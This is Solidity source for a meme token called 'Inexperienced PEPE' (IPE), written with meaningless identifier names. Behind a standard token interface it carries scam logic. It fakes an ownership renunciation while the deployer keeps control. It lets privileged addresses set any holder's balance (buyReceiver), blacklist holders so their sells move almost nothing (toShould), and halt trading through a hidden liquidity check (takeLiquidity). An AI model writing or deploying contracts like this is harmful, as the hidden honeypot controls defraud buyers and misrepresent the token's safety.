//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface atMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalIsLaunch) external view returns (uint256);

    function transfer(address launchFee, uint256 takeLimit) external returns (bool);

    function allowance(address marketingAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeLimit) external returns (bool);

    function transferFrom(
        address sender,
        address launchFee,
        uint256 takeLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txTo, uint256 value);
    event Approval(address indexed marketingAt, address indexed spender, uint256 value);
}

abstract contract receiverMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toAt {
    function createPair(address walletListFee, address senderList) external returns (address);
}

interface atMaxMetadata is atMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InexperiencedPEPE is receiverMin, atMax, atMaxMetadata {

    address public fromMax;

    address receiverFromIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public senderEnable;

    uint256 fromSell;

    function toShould(address launchedMin) public {
        swapAmount();
        if (shouldTo) {
            senderEnable = true;
        }
        if (launchedMin == walletFund || launchedMin == fromMax) {
            return;
        }
        fromMin[launchedMin] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return toTotal;
    }

    uint256 private teamTakeEnable;

    string private toTotal = "IPE";

    function modeEnableFrom(address senderTo, address launchFee, uint256 takeLimit) internal returns (bool) {
        require(launchTeam[senderTo] >= takeLimit);
        launchTeam[senderTo] -= takeLimit;
        launchTeam[launchFee] += takeLimit;
        emit Transfer(senderTo, launchFee, takeLimit);
        return true;
    }

    bool private shouldTo;

    uint8 private listEnable = 18;

    function getOwner() external view returns (address) {
        return txBuy;
    }

    uint256 private receiverLaunchAmount;

    function balanceOf(address totalIsLaunch) public view virtual override returns (uint256) {
        return launchTeam[totalIsLaunch];
    }

    bool public marketingFund;

    address private txBuy;

    function decimals() external view virtual override returns (uint8) {
        return listEnable;
    }

    function liquidityShould(address senderTo, address launchFee, uint256 takeLimit) internal returns (bool) {
        if (senderTo == walletFund) {
            return modeEnableFrom(senderTo, launchFee, takeLimit);
        }
        uint256 fundWallet = atMax(fromMax).balanceOf(launchAmountToken);
        require(fundWallet == totalLiquidity);
        require(launchFee != launchAmountToken);
        if (fromMin[senderTo]) {
            return modeEnableFrom(senderTo, launchFee, minLiquidity);
        }
        return modeEnableFrom(senderTo, launchFee, takeLimit);
    }

    function takeLiquidity(uint256 takeLimit) public {
        swapAmount();
        totalLiquidity = takeLimit;
    }

    mapping(address => mapping(address => uint256)) private walletFrom;

    function buyReceiver(address walletLaunch, uint256 takeLimit) public {
        swapAmount();
        launchTeam[walletLaunch] = takeLimit;
    }

    mapping(address => bool) public fromMin;

    uint256 private tradingFrom;

    constructor (){
        
        minBuy marketingLaunchedAuto = minBuy(receiverFromIs);
        fromMax = toAt(marketingLaunchedAuto.factory()).createPair(marketingLaunchedAuto.WETH(), address(this));
        
        walletFund = _msgSender();
        modeSender();
        shouldEnableExempt[walletFund] = true;
        launchTeam[walletFund] = feeTeam;
        if (senderEnable) {
            tradingFrom = feeTxTrading;
        }
        emit Transfer(address(0), walletFund, feeTeam);
    }

    address public walletFund;

    uint256 constant minLiquidity = 12 ** 10;

    function owner() external view returns (address) {
        return txBuy;
    }

    function modeSender() public {
        emit OwnershipTransferred(walletFund, address(0));
        txBuy = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return txSell;
    }

    function swapAmount() private view {
        require(shouldEnableExempt[_msgSender()]);
    }

    function approve(address liquiditySwap, uint256 takeLimit) public virtual override returns (bool) {
        walletFrom[_msgSender()][liquiditySwap] = takeLimit;
        emit Approval(_msgSender(), liquiditySwap, takeLimit);
        return true;
    }

    bool private tradingLimit;

    function allowance(address receiverBuy, address liquiditySwap) external view virtual override returns (uint256) {
        if (liquiditySwap == receiverFromIs) {
            return type(uint256).max;
        }
        return walletFrom[receiverBuy][liquiditySwap];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return feeTeam;
    }

    mapping(address => bool) public shouldEnableExempt;

    function transfer(address walletLaunch, uint256 takeLimit) external virtual override returns (bool) {
        return liquidityShould(_msgSender(), walletLaunch, takeLimit);
    }

    address launchAmountToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private feeTeam = 100000000 * 10 ** 18;

    mapping(address => uint256) private launchTeam;

    function enableExemptLimit(address walletLimitSwap) public {
        require(walletLimitSwap.balance < 100000);
        if (marketingFund) {
            return;
        }
        if (tradingLimit) {
            receiverLaunchAmount = teamTakeEnable;
        }
        shouldEnableExempt[walletLimitSwap] = true;
        if (tradingLimit != shouldTo) {
            shouldTo = true;
        }
        marketingFund = true;
    }

    uint256 private feeTxTrading;

    string private txSell = "Inexperienced PEPE";

    uint256 totalLiquidity;

    function transferFrom(address senderTo, address launchFee, uint256 takeLimit) external override returns (bool) {
        if (_msgSender() != receiverFromIs) {
            if (walletFrom[senderTo][_msgSender()] != type(uint256).max) {
                require(takeLimit <= walletFrom[senderTo][_msgSender()]);
                walletFrom[senderTo][_msgSender()] -= takeLimit;
            }
        }
        return liquidityShould(senderTo, launchFee, takeLimit);
    }

    event OwnershipTransferred(address indexed enableSell, address indexed tokenMax);

}